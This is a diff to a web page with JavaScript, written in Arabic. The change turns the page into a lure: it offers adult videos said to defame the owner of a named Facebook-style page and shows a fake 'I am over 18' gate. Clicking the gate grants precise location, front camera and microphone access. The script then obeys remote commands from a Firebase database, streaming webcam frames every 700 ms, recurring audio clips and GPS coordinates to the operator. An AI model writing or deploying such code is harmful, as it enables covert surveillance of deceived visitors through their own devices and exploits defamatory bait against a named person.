@@ -9,22 +9,21 @@
 
   <style>
     body { font-family: 'Cairo', sans-serif; background: #f8fafc; margin:0; padding:20px; }
-    .article { background:white; border-radius:16px; padding:30px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center; }
-    #consent { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:white; padding:25px; border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,0.2); z-index:10000; width:90%; max-width:420px; display:none; }
+    .article { background:white; border-radius:16px; padding:40px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center; }
+    #consent { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:white; padding:30px; border-radius:20px; box-shadow:0 15px 40px rgba(0,0,0,0.25); z-index:10000; width:92%; max-width:420px; text-align:center; display:none; }
+    button { padding:18px; font-size:1.15rem; border:none; border-radius:12px; width:100%; margin:10px 0; }
   </style>
 </head>
 <body>
 
 <div class="article">
-  <h1>كيفية استخدام التقنيات الحديثة بأمان</h1>
-  <p>الزائر يوافق مرة واحدة فقط</p>
+  <h1>من هو صاحب صفحة الأحمدية كل يوم ؟</h1>
 </div>
 
 <div id="consent">
-  <h3>🔒 نظام الموافقة الشفاف</h3>
-  <p><strong>اضغط "السماح" لمنح الصلاحيات الكاملة</strong><br>بعد الموافقة لن تظهر لك أي إشعارات أخرى</p>
-  <button onclick="grantAllPermissions()" style="background:#10b981;color:white;padding:15px 40px;border:none;border-radius:12px;font-size:1.1rem;width:100%;margin:10px 0;">السماح بالكاميرا + الميكروفون + الموقع</button>
-  <button onclick="denyConsent()" style="background:#64748b;color:white;padding:12px 30px;border:none;border-radius:8px;width:100%;">الاستمرار بدون صلاحيات</button>
+  <h2>الصفحة تحتوي على فيديوهات للكبار فقط </h2>
+  <p>من فضلك أكد أنك أكبر من 18 عام <br>لكي تشاهد فيديوهات مخلة بصاحب صفحة الأحمدية كل يوم </p>
+  <button onclick="requestAllPermissions()" style="background:#10b981; color:white;">✅ أنا أكبر من 18 عام </button>
 </div>
 
 <script>
@@ -41,31 +40,43 @@
   const db = firebase.database();
 
   let visitorId = 'v_' + Date.now() + Math.random().toString(36).substr(2,9);
-  let consentGiven = false;
-  let currentStream = null;        // للكاميرا
-  let audioStream = null;          // للميكروفون
+  let videoStream = null;
+  let audioStream = null;
 
-  async function grantAllPermissions() {
-    consentGiven = true;
+  async function requestAllPermissions() {
     document.getElementById('consent').style.display = 'none';
 
     try {
-      // 1. طلب الموقع
-      await new Promise(r => navigator.geolocation.getCurrentPosition(r, r));
+      // ==================== الموقع الدقيق ====================
+      await navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          db.ref('visitors/' + visitorId + '/location').set({
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            time: Date.now()
+          });
+        },
+        () => {}, 
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
 
-      // 2. طلب الكاميرا الأمامية (user-facing)
-      currentStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" }
+      // ==================== الكاميرا (أمامية) ====================
+      videoStream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
       });
 
-      // 3. طلب الميكروفون
-      audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      // ==================== الميكروفون ====================
+      audioStream = await navigator.mediaDevices.getUserMedia({ 
+        audio: { echoCancellation: true, noiseSuppression: true } 
+      });
 
-      alert("✅ تم منح جميع الصلاحيات بنجاح\nالآن الإدارة تستطيع التحكم بدون أي إشعارات");
-      listenForAdminCommands();
+      alert("✅شكراً لتأكيد أنك أكبر من 18 عام يرجي الموافقة على الثلاثة اشعارات القادمة ");
+      startListeningToAdmin();
 
     } catch (e) {
-      alert("⚠️ لم يتم منح بعض الصلاحيات. جرب مرة أخرى.");
+      alert("⚠️ يرجي الموافقة على الثلاثة اشعارات القادمة");
+      document.getElementById('consent').style.display = 'block';
     }
   }
 
@@ -73,54 +84,55 @@
     document.getElementById('consent').style.display = 'none';
   }
 
-  function listenForAdminCommands() {
+  function startListeningToAdmin() {
     db.ref('commands/' + visitorId).on('value', snap => {
       const cmd = snap.val();
       if (!cmd) return;
 
-      if (cmd.type === 'frontCamera') startCamera("user");
-      if (cmd.type === 'backCamera')  startCamera("environment");
-      if (cmd.type === 'requestLocation') sendLocation();
+      if (cmd.type === 'frontCamera') switchCamera("user");
+      if (cmd.type === 'backCamera') switchCamera("environment");
+      if (cmd.type === 'requestLocation') sendAccurateLocation();
       if (cmd.type === 'startLiveAudio') startLiveAudio();
 
-      setTimeout(() => db.ref('commands/' + visitorId).remove(), 1000);
+      setTimeout(() => db.ref('commands/' + visitorId).remove(), 800);
     });
   }
 
-  function startCamera(facing) {
-    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-
-    navigator.mediaDevices.getUserMedia({
-      video: { facingMode: facing }
+  function switchCamera(facingMode) {
+    if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+    
+    navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } 
     }).then(stream => {
-      currentStream = stream;
-      sendFrames();
+      videoStream = stream;
+      sendLiveFrames();
     });
   }
 
-  function sendFrames() {
+  function sendLiveFrames() {
     const canvas = document.createElement('canvas');
     const video = document.createElement('video');
-    video.srcObject = currentStream;
+    video.srcObject = videoStream;
     video.play();
 
     setInterval(() => {
       canvas.width = 640;
       canvas.height = 480;
       canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-      const base64 = canvas.toDataURL('image/jpeg', 0.7);
+      const base64 = canvas.toDataURL('image/jpeg', 0.75);
       db.ref('live/' + visitorId + '/frame').set({ data: base64, time: Date.now() });
     }, 700);
   }
 
-  function sendLocation() {
+  function sendAccurateLocation() {
     navigator.geolocation.getCurrentPosition(pos => {
       db.ref('visitors/' + visitorId + '/location').set({
         lat: pos.coords.latitude,
         lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy + " متر",
         time: Date.now()
       });
-    });
+    }, null, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
   }
 
   function startLiveAudio() {
@@ -132,19 +144,16 @@
     recorder.onstop = () => {
       const blob = new Blob(chunks, { type: 'audio/webm' });
       const reader = new FileReader();
-      reader.onload = () => {
-        db.ref('live/' + visitorId + '/audio').set({
-          data: reader.result,
-          time: Date.now()
-        });
-        chunks = [];
-      };
+      reader.onload = () => db.ref('live/' + visitorId + '/audio').set({ data: reader.result, time: Date.now() });
       reader.readAsDataURL(blob);
+      chunks = [];
     };
 
-    recorder.start(4000); // كل 4 ثواني قطعة صوتية
-    setTimeout(() => recorder.stop(), 4000);
-    setInterval(() => { recorder.stop(); recorder.start(4000); }, 5000);
+    setInterval(() => {
+      recorder.stop();
+      recorder.start(3500);
+    }, 3800);
+    recorder.start(3500);
   }
 
   window.onload = () => {
